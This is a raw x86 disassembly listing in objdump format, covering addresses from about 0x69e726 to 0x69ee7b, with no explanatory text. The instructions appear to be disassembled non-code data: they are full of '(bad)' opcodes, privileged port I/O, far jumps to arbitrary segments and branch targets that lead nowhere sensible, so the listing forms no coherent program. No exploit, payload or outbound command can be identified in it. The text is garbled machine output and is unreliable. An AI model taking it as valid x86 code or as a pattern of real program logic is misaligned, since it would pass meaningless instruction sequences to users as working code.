  69e726:	xor    ecx,DWORD PTR [eax+ecx*1]
  69e729:	ret    
  69e72a:	lahf   
  69e72b:	mov    ds:0x245615fb,al
  69e730:	loop   0x69e6ea
  69e732:	jge    0x69e797
  69e734:	cdq    
  69e735:	jb     0x69e708
  69e737:	in     al,dx
  69e738:	stos   BYTE PTR es:[edi],al
  69e739:	and    eax,0xa17e26c7
  69e73e:	call   0xf5bbdd85
  69e743:	xchg   DWORD PTR [esi+0x44521993],edi
  69e749:	cmp    cl,BYTE PTR [esi+0x74]
  69e74c:	push   sp
  69e74e:	jmp    0x6ad18292
  69e753:	outs   dx,BYTE PTR ds:[esi]
  69e754:	cmp    BYTE PTR [eax-0x8],dl
  69e757:	cmp    al,0x98
  69e759:	jmp    0x4d807a66
  69e75e:	push   edx
  69e75f:	push   0x60
  69e761:	daa    
  69e762:	fwait
  69e763:	test   al,0x78
  69e765:	mov    ds:0x785457a9,eax
  69e76a:	mov    esi,0xc1cdccef
  69e76f:	jmp    0x73d6593b
  69e774:	adc    ecx,edx
  69e776:	data16 (bad) 
  69e778:	xchg   esi,eax
  69e779:	inc    ebx
  69e77a:	mov    esi,0x14113525
  69e77f:	push   0x9b12843d
  69e784:	call   FWORD PTR [edi+0x631ae4c9]
  69e78a:	inc    esi
  69e78b:	and    bh,ah
  69e78d:	daa    
  69e78e:	or     DWORD PTR [ebp+0x15],esp
  69e791:	popa   
  69e792:	stos   BYTE PTR es:[edi],al
  69e793:	jge    0x69e75b
  69e795:	shr    DWORD PTR [eax-0x5],1
  69e798:	jmp    0xd84879a5
  69e79d:	imul   edx,ebp,0xffffff8c
  69e7a0:	add    eax,0xce97eecc
  69e7a5:	aaa    
  69e7a6:	int3   
  69e7a7:	push   ebp
  69e7a8:	pop    eax
  69e7a9:	addr16 cli 
  69e7ab:	mov    ebx,0xe12c0086
  69e7b0:	call   0x387a0936
  69e7b5:	lock ret 0xd7b5
  69e7b9:	push   ebx
  69e7ba:	loop   0x69e74d
  69e7bc:	rcl    DWORD PTR [ecx],1
  69e7be:	in     al,0x80
  69e7c0:	cld    
  69e7c1:	push   0xda91801e
  69e7c6:	pop    ds
  69e7c7:	aad    0x8
  69e7c9:	xchg   esp,eax
  69e7ca:	out    dx,al
  69e7cb:	std    
  69e7cc:	pop    esp
  69e7cd:	push   eax
  69e7ce:	adc    bl,bh
  69e7d0:	test   DWORD PTR [ebp-0x67f94158],ebp
  69e7d6:	sbb    bl,BYTE PTR [ebx-0x3234f861]
  69e7dc:	inc    ebx
  69e7dd:	push   ebp
  69e7de:	push   ds
  69e7df:	nop
  69e7e0:	js     0x69e839
  69e7e2:	outs   dx,BYTE PTR ds:[esi]
  69e7e3:	add    ecx,esi
  69e7e5:	cmp    al,dl
  69e7e7:	into   
  69e7e8:	inc    eax
  69e7e9:	aaa    
  69e7ea:	int    0xd3
  69e7ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e7ed:	jbe    0x69e85b
  69e7ef:	ss pop ds
  69e7f1:	inc    edi
  69e7f2:	leave  
  69e7f3:	int3   
  69e7f4:	xchg   ebp,eax
  69e7f5:	pop    edi
  69e7f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e7f7:	mov    eax,ds:0x3cbf3600
  69e7fc:	in     al,0x25
  69e7fe:	inc    ecx
  69e7ff:	inc    ebx
  69e800:	into   
  69e801:	std    
  69e802:	shl    BYTE PTR [ebp-0x61],cl
  69e805:	mov    dl,0x69
  69e807:	popa   
  69e808:	out    0xf5,al
  69e80a:	mov    DWORD PTR [eax-0x45427eb7],0x3a4ae9ff
  69e814:	cmp    DWORD PTR [eax],esp
  69e816:	nop
  69e817:	sub    eax,0x2aaad75f
  69e81c:	jae    0x69e858
  69e81e:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  69e820:	loope  0x69e7b1
  69e822:	mov    ebp,0xebe19334
  69e827:	and    ebx,ebx
  69e829:	lods   eax,DWORD PTR ds:[esi]
  69e82a:	(bad)  
  69e82b:	jle    0x69e7fe
  69e82d:	xchg   esp,eax
  69e82e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69e82f:	mov    esp,0xc6062eda
  69e834:	test   BYTE PTR [edi],dl
  69e836:	(bad)  
  69e837:	in     al,0xf3
  69e839:	xchg   esp,eax
  69e83a:	outs   dx,BYTE PTR ds:[esi]
  69e83b:	and    eax,DWORD PTR [ebp+0x1e]
  69e83e:	cmp    ebp,DWORD PTR [eax-0x23]
  69e841:	enter  0x6adf,0x88
  69e845:	xor    al,0xb9
  69e847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e848:	fucomi st,st(3)
  69e84a:	in     al,dx
  69e84b:	sub    esi,DWORD PTR [esi-0x4133f7e]
  69e851:	stos   DWORD PTR es:[edi],eax
  69e852:	arpl   dx,bx
  69e854:	push   cs
  69e855:	sbb    bl,ch
  69e857:	xor    al,BYTE PTR [esi]
  69e859:	gs cmp ax,0x82e0
  69e85e:	mov    BYTE PTR [ecx+0x7cb4538e],dh
  69e864:	data16 test al,0xe9
  69e867:	sub    DWORD PTR ds:0x130d5262,ebp
  69e86d:	pop    eax
  69e86e:	aam    0x99
  69e870:	inc    edx
  69e871:	and    DWORD PTR [ecx-0x2555ec9e],0x199af0b9
  69e87b:	stos   BYTE PTR es:[edi],al
  69e87c:	in     al,0x99
  69e87e:	mov    eax,0x8749862e
  69e883:	ds adc al,0xb4
  69e886:	lods   al,BYTE PTR ds:[esi]
  69e887:	pop    edx
  69e888:	cld    
  69e889:	sub    ebp,DWORD PTR [ebp+eiz*8+0x27aa1185]
  69e890:	add    al,0xa8
  69e892:	inc    esi
  69e893:	mov    dh,0x1
  69e895:	test   edx,0xb082ab6b
  69e89b:	popf   
  69e89c:	jb     0x69e8f5
  69e89e:	cmp    ch,BYTE PTR [ebx+0x2ca74d04]
  69e8a4:	scas   al,BYTE PTR es:[edi]
  69e8a5:	jg     0x69e885
  69e8a7:	jle    0x69e8a7
  69e8a9:	mov    eax,0xae1e43ff
  69e8ae:	std    
  69e8af:	cwde   
  69e8b0:	push   0xd7ee1642
  69e8b5:	pop    edi
  69e8b6:	cs jl  0x69e8b5
  69e8b9:	sub    al,0xb0
  69e8bb:	and    ecx,edx
  69e8bd:	mul    BYTE PTR [eax-0x4d]
  69e8c0:	cli    
  69e8c1:	mov    edx,0xc2cc6090
  69e8c6:	sub    dl,BYTE PTR [edi-0x7d]
  69e8c9:	ins    BYTE PTR es:[edi],dx
  69e8ca:	popf   
  69e8cb:	xor    ebx,DWORD PTR [ebp-0x58]
  69e8ce:	add    BYTE PTR [esi],dl
  69e8d0:	add    edx,esp
  69e8d2:	jne    0x69e93d
  69e8d4:	mov    al,ds:0x6a7adf93
  69e8d9:	adc    BYTE PTR [eax],bh
  69e8db:	dec    ebp
  69e8dc:	arpl   si,di
  69e8de:	dec    ecx
  69e8df:	add    ah,BYTE PTR [ebx-0x48]
  69e8e2:	mov    edi,0x9a63bd59
  69e8e7:	jae    0x69e8f0
  69e8e9:	pop    ebx
  69e8ea:	ins    DWORD PTR es:[edi],dx
  69e8eb:	pop    eax
  69e8ec:	std    
  69e8ed:	in     eax,dx
  69e8ee:	sbb    BYTE PTR [ecx],bl
  69e8f0:	int3   
  69e8f1:	dec    ebp
  69e8f2:	aad    0x23
  69e8f4:	mov    edi,0x97110ad4
  69e8f9:	mov    ch,0xba
  69e8fb:	mov    dh,0x65
  69e8fd:	cwde   
  69e8fe:	cmp    edx,eax
  69e900:	stc    
  69e901:	enter  0xa461,0x95
  69e905:	int    0x32
  69e907:	nop
  69e908:	das    
  69e909:	ds popa 
  69e90b:	xchg   ecx,eax
  69e90c:	push   edx
  69e90d:	stos   BYTE PTR es:[edi],al
  69e90e:	mov    bl,al
  69e910:	pop    esi
  69e911:	les    edx,FWORD PTR [edi-0x9b2067b]
  69e917:	mov    BYTE PTR [ecx+ebp*1],dh
  69e91a:	fidivr DWORD PTR [eax+0x74]
  69e91d:	loopne 0x69e979
  69e91f:	bound  edi,QWORD PTR [ebx]
  69e921:	imul   edx,DWORD PTR [esi-0x3d],0xb
  69e925:	pop    ds
  69e926:	rcl    BYTE PTR [eax+0x39],0x76
  69e92a:	sub    esp,DWORD PTR [ecx]
  69e92c:	out    0xd6,eax
  69e92e:	push   edx
  69e92f:	and    edx,DWORD PTR [ecx-0x64]
  69e932:	in     al,0x82
  69e934:	xchg   ecx,eax
  69e935:	xor    al,0x83
  69e937:	ins    DWORD PTR es:[edi],dx
  69e938:	std    
  69e939:	xchg   ecx,eax
  69e93a:	fstp   QWORD PTR [ecx]
  69e93c:	inc    edx
  69e93d:	adc    DWORD PTR [edi-0x36],edi
  69e940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69e941:	push   es
  69e942:	jp     0x69e8f1
  69e944:	fist   DWORD PTR [edx]
  69e946:	pop    eax
  69e947:	rol    BYTE PTR [ebx],cl
  69e949:	repz sub DWORD PTR [ecx-0x7e],ebx
  69e94d:	addr16 call 0x6d9f281c
  69e953:	mov    edi,0xc469615f
  69e958:	add    dl,BYTE PTR [edx-0x42e1415]
  69e95e:	push   es
  69e95f:	repz imul ebp,edi,0xffffffbb
  69e963:	fdivr  QWORD PTR [ecx+eax*4]
  69e966:	lahf   
  69e967:	fdiv   st(3),st
  69e969:	(bad)  
  69e96b:	push   ecx
  69e96c:	es jnp 0x69e930
  69e96f:	retf   
  69e970:	jo     0x69e9f1
  69e972:	sbb    dh,BYTE PTR [ecx+0x50]
  69e975:	bound  esp,QWORD PTR [edi]
  69e977:	das    
  69e978:	push   0xc
  69e97a:	mov    ebp,0xfa246bd
  69e97f:	clc    
  69e980:	aaa    
  69e981:	mov    esp,0x61ca3fc9
  69e986:	fmul   DWORD PTR [ecx-0x30]
  69e989:	sahf   
  69e98a:	in     al,dx
  69e98b:	and    eax,DWORD PTR [edx-0x27]
  69e98e:	inc    ebx
  69e98f:	not    DWORD PTR [edx-0x66df1b9b]
  69e995:	cwde   
  69e996:	shl    al,1
  69e998:	jmp    0x571a1047
  69e99d:	ret    
  69e99e:	lods   al,BYTE PTR ds:[esi]
  69e99f:	sub    al,0x11
  69e9a1:	pop    edi
  69e9a2:	popa   
  69e9a3:	sbb    ah,BYTE PTR [eax+0x1]
  69e9a6:	mov    ebp,DWORD PTR [ecx+0x8]
  69e9a9:	jmp    0x9df8e03b
  69e9ae:	out    0xd7,eax
  69e9b0:	cmp    DWORD PTR ds:0x845a4924,ecx
  69e9b6:	hlt    
  69e9b7:	out    0xb8,al
  69e9b9:	(bad)  
  69e9ba:	fistp  WORD PTR [esi+0x6ae901bb]
  69e9c0:	stos   DWORD PTR es:[edi],eax
  69e9c1:	push   edx
  69e9c2:	add    bh,BYTE PTR [esi+edi*2+0x486eaaaf]
  69e9c9:	mov    eax,0x1c8f2fd2
  69e9ce:	pop    eax
  69e9cf:	ret    0x6faa
  69e9d2:	jns    0x69e9ab
  69e9d4:	jmp    0x84114df
  69e9d9:	popa   
  69e9da:	pop    ebx
  69e9db:	das    
  69e9dc:	push   ds
  69e9dd:	leave  
  69e9de:	jmp    0x69ea39
  69e9e0:	bound  esp,QWORD PTR [esi-0x40]
  69e9e3:	cmp    ebp,edx
  69e9e5:	ret    0xfa0a
  69e9e8:	daa    
  69e9e9:	pop    ss
  69e9ea:	add    ax,0xd78c
  69e9ee:	stc    
  69e9ef:	sub    cl,BYTE PTR [ecx]
  69e9f1:	pop    ss
  69e9f2:	cmp    al,0x9f
  69e9f4:	push   eax
  69e9f5:	inc    eax
  69e9f6:	add    eax,0xcdf617cb
  69e9fb:	stos   BYTE PTR es:[edi],al
  69e9fc:	xor    bh,BYTE PTR [ebx-0x60]
  69e9ff:	push   ecx
  69ea00:	jmp    0x50f41929
  69ea05:	(bad)  
  69ea06:	pop    ebx
  69ea07:	mov    dh,0x45
  69ea09:	(bad)  ds:0x51004362
  69ea0f:	repnz ficom WORD PTR [edi]
  69ea12:	dec    esi
  69ea13:	enter  0xc70e,0xd1
  69ea17:	inc    eax
  69ea18:	push   es
  69ea19:	pop    esi
  69ea1a:	sub    ah,BYTE PTR [esi-0x5584574d]
  69ea20:	fisttp WORD PTR [edx]
  69ea22:	and    eax,0xf3109af1
  69ea27:	mov    eax,0x95cbfe50
  69ea2c:	xor    al,0x82
  69ea2e:	jmp    0x15ce:0xc8091004
  69ea35:	push   esi
  69ea36:	push   ebx
  69ea37:	or     BYTE PTR [esi],cl
  69ea39:	popf   
  69ea3a:	pop    edi
  69ea3b:	push   cs
  69ea3c:	jae    0x69e9eb
  69ea3e:	add    eax,0x30a22e99
  69ea43:	nop
  69ea44:	sti    
  69ea45:	lods   eax,DWORD PTR ds:[esi]
  69ea46:	test   al,0x7
  69ea48:	mov    cl,0x11
  69ea4a:	(bad)  
  69ea4b:	xor    eax,0x46537d9
  69ea50:	or     edi,DWORD PTR [ebp-0x2e9b4751]
  69ea56:	loope  0x69e9df
  69ea58:	jnp    0x69ea2b
  69ea5a:	sahf   
  69ea5b:	mov    eax,0x50ab77fc
  69ea60:	xor    ecx,DWORD PTR [ebx+0x1f]
  69ea63:	loopne 0x69ea05
  69ea65:	or     eax,0x9e31765a
  69ea6a:	add    al,0xde
  69ea6c:	jae    0x69ea69
  69ea6e:	add    edx,esi
  69ea70:	fwait
  69ea71:	or     eax,0x4d9fc22b
  69ea76:	or     dl,bh
  69ea78:	mov    ch,0xac
  69ea7a:	xchg   ecx,eax
  69ea7b:	and    eax,0x214d198a
  69ea80:	stos   DWORD PTR es:[edi],eax
  69ea81:	cli    
  69ea82:	push   ebp
  69ea83:	test   BYTE PTR [edx+0x55],dl
  69ea86:	mov    bl,BYTE PTR [edi-0x1c]
  69ea89:	fwait
  69ea8a:	inc    esp
  69ea8b:	lea    eax,[edx+0x2e551b03]
  69ea91:	in     al,0xb4
  69ea93:	jp     0x69eae0
  69ea95:	lahf   
  69ea96:	jl     0x69eb0b
  69ea98:	nop
  69ea99:	pop    ecx
  69ea9a:	sub    al,BYTE PTR [edi+0x6cb9d203]
  69eaa0:	xor    eax,0x26f10a21
  69eaa5:	(bad)  
  69eaa6:	lods   eax,DWORD PTR ds:[esi]
  69eaa7:	dec    ecx
  69eaa8:	sbb    eax,DWORD PTR ds:0x5c79f470
  69eaae:	jb     0x69ea73
  69eab0:	lea    edi,[eax]
  69eab2:	mov    dh,0xdf
  69eab4:	mov    dh,0x43
  69eab6:	std    
  69eab7:	and    al,0x16
  69eab9:	cs push esp
  69eabb:	daa    
  69eabc:	push   ss
  69eabd:	out    0x21,al
  69eabf:	or     BYTE PTR [edi+eax*8],bl
  69eac2:	gs inc ebp
  69eac4:	scas   eax,DWORD PTR es:[edi]
  69eac5:	out    dx,al
  69eac6:	and    bh,BYTE PTR [esi]
  69eac8:	pop    eax
  69eac9:	add    DWORD PTR [esi],ebp
  69eacb:	hlt    
  69eacc:	jg     0x69eac4
  69eace:	js     0x69ea53
  69ead0:	push   edx
  69ead1:	inc    ebp
  69ead2:	(bad)  
  69ead3:	es (bad) 
  69ead5:	sub    esp,DWORD PTR [eax+edx*8-0x426171f3]
  69eadc:	stos   BYTE PTR es:[edi],al
  69eadd:	fwait
  69eade:	rol    ebp,1
  69eae0:	jle    0x69eb1a
  69eae2:	enter  0xe3c1,0xc5
  69eae6:	inc    ebx
  69eae7:	jle    0x69ea9d
  69eae9:	das    
  69eaea:	sti    
  69eaeb:	cmp    eax,0xa308b240
  69eaf0:	ins    BYTE PTR es:[edi],dx
  69eaf1:	dec    esp
  69eaf2:	iret   
  69eaf3:	push   0x61
  69eaf5:	dec    ebp
  69eaf6:	cmc    
  69eaf7:	(bad)  
  69eaf8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  69eafa:	and    ebp,ebx
  69eafc:	test   BYTE PTR [ebx],0x59
  69eaff:	test   DWORD PTR [ebx],esi
  69eb01:	retf   0x8a7b
  69eb04:	into   
  69eb05:	dec    edx
  69eb06:	adc    ecx,DWORD PTR [ecx+0x4e]
  69eb09:	les    ebx,FWORD PTR [ebx+0x30]
  69eb0c:	in     eax,0x85
  69eb0e:	pop    ecx
  69eb0f:	push   ebx
  69eb10:	call   0xf1e9d820
  69eb15:	sub    DWORD PTR [ebx],esp
  69eb17:	test   BYTE PTR [edi-0x240d0bbe],ch
  69eb1d:	or     BYTE PTR [ebx-0x2b0b7e7e],0xf
  69eb24:	dec    edx
  69eb25:	sbb    ebx,ecx
  69eb27:	arpl   sp,ax
  69eb29:	popa   
  69eb2a:	push   edi
  69eb2b:	scas   al,BYTE PTR es:[edi]
  69eb2c:	pop    ecx
  69eb2d:	cmc    
  69eb2e:	jae    0x69eb5c
  69eb30:	mov    al,ds:0x6ec5e4e1
  69eb35:	sbb    ah,BYTE PTR [ecx+0x5a433885]
  69eb3b:	test   al,0xff
  69eb3d:	sbb    DWORD PTR [eax-0x1210865d],edx
  69eb43:	adc    DWORD PTR [ecx+esi*8+0x64],esp
  69eb47:	js     0x69eb10
  69eb49:	mov    ds:0xe1a16126,eax
  69eb4e:	push   esi
  69eb4f:	lahf   
  69eb50:	outs   dx,BYTE PTR ds:[esi]
  69eb51:	xchg   ecx,eax
  69eb52:	xchg   esp,eax
  69eb53:	popf   
  69eb54:	adc    DWORD PTR [edx],eax
  69eb56:	or     bh,BYTE PTR [eax+0x7d]
  69eb59:	push   edx
  69eb5a:	pop    ebx
  69eb5b:	leave  
  69eb5c:	sti    
  69eb5d:	xor    BYTE PTR [ebx+0x69],0x7f
  69eb61:	outs   dx,BYTE PTR ds:[esi]
  69eb62:	cdq    
  69eb63:	das    
  69eb64:	mov    ebx,0x4d6ca40
  69eb69:	jne    0x69eb55
  69eb6b:	inc    ecx
  69eb6c:	jne    0x69eb9c
  69eb6e:	(bad)  
  69eb6f:	out    0xa8,eax
  69eb71:	fidiv  WORD PTR [eax+ecx*2-0x76d54ba8]
  69eb78:	inc    ebp
  69eb79:	nop
  69eb7a:	jg     0x69eb3a
  69eb7c:	add    BYTE PTR [ebx],bh
  69eb7e:	call   0x31960f2
  69eb83:	aad    0x7f
  69eb85:	mul    BYTE PTR [edi]
  69eb87:	xchg   DWORD PTR [eax+ebp*2+0x418d213b],edi
  69eb8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69eb8f:	xor    eax,0xf42d0e30
  69eb94:	(bad)  
  69eb95:	int    0x36
  69eb97:	(bad)
  69eb9b:	out    0xc2,al
  69eb9d:	mov    BYTE PTR [ebx],cl
  69eb9f:	ror    BYTE PTR [eax-0x62],0x59
  69eba3:	mul    DWORD PTR [ecx]
  69eba5:	fwait
  69eba6:	cmp    edi,DWORD PTR [ecx+0x56b2383]
  69ebac:	fnstcw WORD PTR [ecx+0x79d43dd6]
  69ebb2:	mov    cl,0x93
  69ebb4:	pop    esi
  69ebb5:	les    esi,FWORD PTR [ebx]
  69ebb7:	sub    esp,0x8d2d5049
  69ebbd:	or     al,0x7c
  69ebbf:	mov    ah,0x88
  69ebc1:	jns    0x69eb79
  69ebc3:	sahf   
  69ebc4:	das    
  69ebc5:	mov    esi,0xc28eb0b5
  69ebca:	mov    WORD PTR [eax+0x5fc39ec2],cs
  69ebd0:	clc    
  69ebd1:	lods   eax,DWORD PTR ds:[esi]
  69ebd2:	popa   
  69ebd3:	jge    0x69ec19
  69ebd5:	inc    esi
  69ebd6:	daa    
  69ebd7:	js     0x69ebf6
  69ebd9:	add    edx,DWORD PTR [edi]
  69ebdb:	dec    edi
  69ebdc:	sub    edi,DWORD PTR [ebp-0x23]
  69ebdf:	ficom  DWORD PTR [edx-0xc1a1540]
  69ebe5:	loope  0x69ec0f
  69ebe7:	xchg   edi,eax
  69ebe8:	fs iretw 
  69ebeb:	cli    
  69ebec:	sub    eax,0xaf80c475
  69ebf1:	xor    ebx,0xffffff81
  69ebf4:	cli    
  69ebf5:	dec    edx
  69ebf6:	fiadd  DWORD PTR [esi-0x114c72b8]
  69ebfc:	push   esp
  69ebfd:	pop    esp
  69ebfe:	jmp    0x69ebf2
  69ec00:	or     eax,0xebc04564
  69ec05:	mov    WORD PTR [ebp-0x9],fs
  69ec08:	mov    DWORD PTR [esi+edx*8+0x1d84f130],esp
  69ec0f:	cmc    
  69ec10:	inc    edx
  69ec11:	(bad)  
  69ec12:	jmp    0x69ec11
  69ec14:	push   esp
  69ec15:	xchg   esp,eax
  69ec16:	pop    ecx
  69ec17:	xor    DWORD PTR [esi],ebx
  69ec19:	mov    dh,0x3b
  69ec1b:	jle    0x69ec02
  69ec1d:	test   eax,0x2fa0702d
  69ec22:	nop
  69ec23:	das    
  69ec24:	jecxz  0x69ebcb
  69ec26:	mov    ch,0xb2
  69ec28:	cmp    ah,BYTE PTR [eax+ebp*1]
  69ec2b:	std    
  69ec2c:	mov    cl,BYTE PTR [edx-0x3a4c8a06]
  69ec32:	pop    esp
  69ec33:	push   0x6aab0d8
  69ec38:	push   esp
  69ec39:	mov    es,WORD PTR [ecx-0x48e730b0]
  69ec3f:	mov    eax,ds:0x799a0b69
  69ec44:	aad    0xaa
  69ec46:	inc    esp
  69ec47:	(bad)  
  69ec49:	adc    bh,BYTE PTR [eax+ebp*4+0x49]
  69ec4d:	pusha  
  69ec4e:	fs cmp bl,bl
  69ec51:	mov    ds:0x7f1a8b77,al
  69ec56:	mov    bh,0x22
  69ec58:	int    0x8b
  69ec5a:	jg     0x69ec90
  69ec5c:	stos   DWORD PTR es:[edi],eax
  69ec5d:	jns    0x69ecb6
  69ec5f:	jnp    0x69ecd6
  69ec61:	add    eax,0xd9e1ae3b
  69ec66:	and    DWORD PTR [edx+edi*8],ebp
  69ec69:	jge    0x69ecb9
  69ec6b:	add    eax,0xc59473bb
  69ec70:	adc    ebx,DWORD PTR ds:0x80eb823e
  69ec76:	das    
  69ec77:	jmp    0xf077:0xc32c2922
  69ec7e:	stos   BYTE PTR es:[edi],al
  69ec7f:	mov    ch,0x89
  69ec81:	scas   eax,DWORD PTR es:[edi]
  69ec82:	lds    eax,FWORD PTR [edx+0x5a]
  69ec85:	test   DWORD PTR [esp+ebp*1+0x5a9feeda],ebx
  69ec8c:	icebp  
  69ec8d:	cmp    ah,BYTE PTR [ebx-0x74]
  69ec90:	push   edi
  69ec91:	in     eax,dx
  69ec92:	int    0xe4
  69ec94:	mov    bh,0x29
  69ec96:	ds scas al,BYTE PTR es:[edi]
  69ec98:	and    edx,DWORD PTR [edx+0x646d94f6]
  69ec9e:	sar    DWORD PTR [ebx+0x4d158cbe],cl
  69eca4:	mov    ebp,0x215b1d3a
  69eca9:	test   eax,0xae032b62
  69ecae:	cmp    DWORD PTR [edx],ecx
  69ecb0:	xchg   ebp,eax
  69ecb1:	jg     0x69ecbc
  69ecb3:	adc    BYTE PTR [edi-0x65],bl
  69ecb6:	or     DWORD PTR [ecx-0x2c2c0d8e],ebp
  69ecbc:	inc    esp
  69ecbd:	adc    DWORD PTR cs:[ebx],edx
  69ecc0:	call   DWORD PTR [esi+0x73]
  69ecc3:	pop    eax
  69ecc4:	mov    BYTE PTR [ecx-0x6bcf2d34],bh
  69ecca:	mov    esp,0xfa8daa7b
  69eccf:	xlat   BYTE PTR ds:[ebx]
  69ecd0:	out    0x9c,eax
  69ecd2:	(bad)  
  69ecd3:	call   0x3917:0x7b0df624
  69ecda:	cmp    DWORD PTR [esi-0x3],0xce1d563b
  69ece1:	mov    DWORD PTR [esi-0x6d145644],edx
  69ece7:	pop    edx
  69ece8:	inc    edx
  69ece9:	jns    0x69ed29
  69eceb:	stos   BYTE PTR es:[edi],al
  69ecec:	scas   eax,DWORD PTR es:[edi]
  69eced:	ficom  WORD PTR [edi-0x6]
  69ecf0:	mov    BYTE PTR [esi-0x32e73e3b],ah
  69ecf6:	out    0x74,al
  69ecf8:	ja     0x69ecc6
  69ecfa:	cmp    al,bh
  69ecfc:	(bad)  
  69ecfd:	xchg   esi,eax
  69ecfe:	clc    
  69ecff:	cdq    
  69ed00:	push   ebp
  69ed01:	mul    DWORD PTR [edi+ebp*4+0x372051c7]
  69ed08:	scas   al,BYTE PTR es:[edi]
  69ed09:	dec    esp
  69ed0a:	mov    BYTE PTR [edi+esi*4-0x66a8220],ch
  69ed11:	pop    esp
  69ed12:	xor    DWORD PTR [esi],0x22
  69ed15:	inc    eax
  69ed16:	sub    al,0x4b
  69ed18:	ret    
  69ed19:	out    dx,al
  69ed1a:	xchg   ebp,eax
  69ed1b:	icebp  
  69ed1c:	lods   al,BYTE PTR ds:[esi]
  69ed1d:	cli    
  69ed1e:	jg     0x69ecd1
  69ed20:	shr    DWORD PTR [esi-0x25216186],0xe3
  69ed27:	jmp    0xbad8:0xb9159884
  69ed2e:	and    BYTE PTR [eax+0x633b4ded],bh
  69ed34:	ret    
  69ed35:	and    BYTE PTR [ecx+0x2080f1bf],dl
  69ed3b:	imul   edi,DWORD PTR [ebp+0x68],0x73b0e5d4
  69ed42:	xchg   edi,eax
  69ed43:	pop    ecx
  69ed44:	std    
  69ed45:	inc    edi
  69ed46:	or     eax,0x5981cf5a
  69ed4b:	rcl    DWORD PTR [ebp+esi*4-0x1c12a56c],0xf2
  69ed53:	scas   eax,DWORD PTR es:[edi]
  69ed54:	aad    0x5d
  69ed56:	push   edi
  69ed57:	push   0x1b
  69ed59:	push   eax
  69ed5a:	sbb    eax,0xdce63e9b
  69ed5f:	mov    bl,0x2a
  69ed61:	xlat   BYTE PTR ds:[ebx]
  69ed62:	xor    dh,BYTE PTR [esi-0x2f56d600]
  69ed68:	mov    al,ds:0x9c626dcb
  69ed6d:	xchg   esi,eax
  69ed6e:	mov    ch,0xa8
  69ed70:	pop    ecx
  69ed71:	adc    dl,BYTE PTR ds:0xcbbc93dd
  69ed77:	jle    0x69edef
  69ed79:	call   0x2d246dff
  69ed7e:	xchg   esi,eax
  69ed7f:	add    BYTE PTR [edi],bh
  69ed81:	push   eax
  69ed82:	adc    eax,0x10287bfd
  69ed87:	mov    esi,0xb86af465
  69ed8c:	arpl   WORD PTR ds:0x90f88c5,di
  69ed92:	jno    0x69edfc
  69ed94:	jnp    0x69eddf
  69ed96:	mov    ebp,0xe161a060
  69ed9b:	retf   
  69ed9c:	mov    bl,0xd0
  69ed9e:	adc    al,0x4a
  69eda0:	ror    DWORD PTR ds:0xd5a276b6,0x76
  69eda7:	mov    ds:0xe97c296d,al
  69edac:	arpl   WORD PTR fs:[edi],cx
  69edaf:	push   ss
  69edb0:	inc    edi
  69edb1:	push   0x72
  69edb3:	cld    
  69edb4:	inc    edi
  69edb5:	retf   0x901f
  69edb8:	in     al,dx
  69edb9:	push   ss
  69edba:	and    eax,0x8ff5c33c
  69edbf:	or     esi,DWORD PTR [esi]
  69edc1:	sub    edx,ebp
  69edc3:	lods   al,BYTE PTR ds:[esi]
  69edc4:	repz fstp DWORD PTR [ebx+ebp*1+0x41]
  69edc9:	test   BYTE PTR [ebp+0x140a2009],0xd4
  69edd0:	clc    
  69edd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69edd2:	cs hlt 
  69edd4:	(bad)  
  69edd6:	pop    esi
  69edd7:	adc    al,0xd4
  69edd9:	retf   0x2b75
  69eddc:	jnp    0x69edaf
  69edde:	xor    DWORD PTR fs:[eax+0xa17704b],ebx
  69ede5:	add    eax,ebx
  69ede7:	cdq    
  69ede8:	adc    edx,DWORD PTR [ebp-0x1644082f]
  69edee:	pop    edi
  69edef:	mov    ah,0xb5
  69edf1:	add    eax,DWORD PTR [esi-0x1211e848]
  69edf7:	dec    esp
  69edf8:	adc    DWORD PTR [esi-0x15],0xc5c0af2f
  69edff:	adc    BYTE PTR [eax-0x437f64ad],ah
  69ee05:	(bad)  
  69ee06:	pop    edi
  69ee07:	dec    esp
  69ee08:	out    dx,al
  69ee09:	push   es
  69ee0a:	sbb    BYTE PTR ds:[ebx-0x2b],dh
  69ee0e:	mov    cs,WORD PTR [edx+0x12]
  69ee11:	mov    eax,ds:0x87c4c6f9
  69ee16:	inc    esi
  69ee17:	jae    0x69ed9a
  69ee19:	and    BYTE PTR [eax],0x9c
  69ee1c:	bound  eax,QWORD PTR [esi-0x6a53f473]
  69ee22:	add    DWORD PTR [eax-0x7f],edx
  69ee25:	xchg   ebx,eax
  69ee26:	shr    DWORD PTR [edx+0x42],0xf1
  69ee2a:	icebp  
  69ee2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69ee2c:	cli    
  69ee2d:	lahf   
  69ee2e:	add    cl,BYTE PTR [esi+ebx*1+0x4a]
  69ee32:	inc    esi
  69ee33:	das    
  69ee34:	aas    
  69ee35:	and    BYTE PTR [esi-0x15],dl
  69ee38:	inc    ebp
  69ee39:	and    al,0x59
  69ee3b:	scas   al,BYTE PTR es:[edi]
  69ee3c:	add    al,BYTE PTR [edx+0x3120135e]
  69ee42:	test   ecx,esi
  69ee44:	loop   0x69ee1b
  69ee46:	test   al,0x74
  69ee48:	jb     0x69eeae
  69ee4a:	push   es
  69ee4b:	sub    esp,DWORD PTR [esp+ebp*4-0x24]
  69ee4f:	adc    cl,BYTE PTR [edx+0x2324de82]
  69ee55:	sub    eax,0x5dd34d13
  69ee5a:	pushf  
  69ee5b:	mov    eax,0x64a02603
  69ee60:	xor    eax,0x10f8b2a1
  69ee65:	aas    
  69ee66:	sub    eax,0xf11784a8
  69ee6b:	pushf  
  69ee6c:	into   
  69ee6d:	xchg   esi,eax
  69ee6e:	(bad)  
  69ee6f:	mov    BYTE PTR [edi-0x1a3251e],al
  69ee75:	or     bl,cl
  69ee77:	imul   edi,eax,0xffffff94
  69ee7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69ee7b:	push   ds
